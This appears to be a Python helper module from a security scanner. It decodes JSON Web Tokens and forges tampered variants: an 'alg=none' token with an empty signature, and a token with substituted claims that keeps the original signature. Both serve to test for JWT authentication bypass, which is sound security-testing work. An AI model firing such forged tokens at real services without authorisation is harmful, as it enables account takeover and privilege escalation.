"""Deep JWT handling: decode + tamper (alg-none, claim substitution).

Pure and dependency-free — used by the JWT detector/exploit to test alg-confusion
and claim-tampering. No signing (that's a target-key problem); these produce the
tampered tokens to fire.
"""

from __future__ import annotations

import base64
import json
from typing import Any


def _b64url_decode(segment: str) -> bytes:
    padded = segment + "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(padded)


def _b64url_encode(obj: dict[str, Any]) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def decode_jwt(token: str) -> tuple[dict[str, Any], dict[str, Any]]:
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    if not isinstance(header, dict) or not isinstance(payload, dict):
        raise ValueError("malformed JWT segments")
    return header, payload


def tamper_alg_none(token: str) -> str:
    """Return an ``alg=none`` variant with an empty signature (alg-confusion test)."""
    header, payload = decode_jwt(token)
    header["alg"] = "none"
    return f"{_b64url_encode(header)}.{_b64url_encode(payload)}."


def tamper_claim(token: str, **claims: Any) -> str:
    """Return a variant with substituted payload claims (signature preserved as-is)."""
    header, payload = decode_jwt(token)
    payload.update(claims)
    parts = token.split(".")
    signature = parts[2] if len(parts) > 2 else ""
    return f"{_b64url_encode(header)}.{_b64url_encode(payload)}.{signature}"
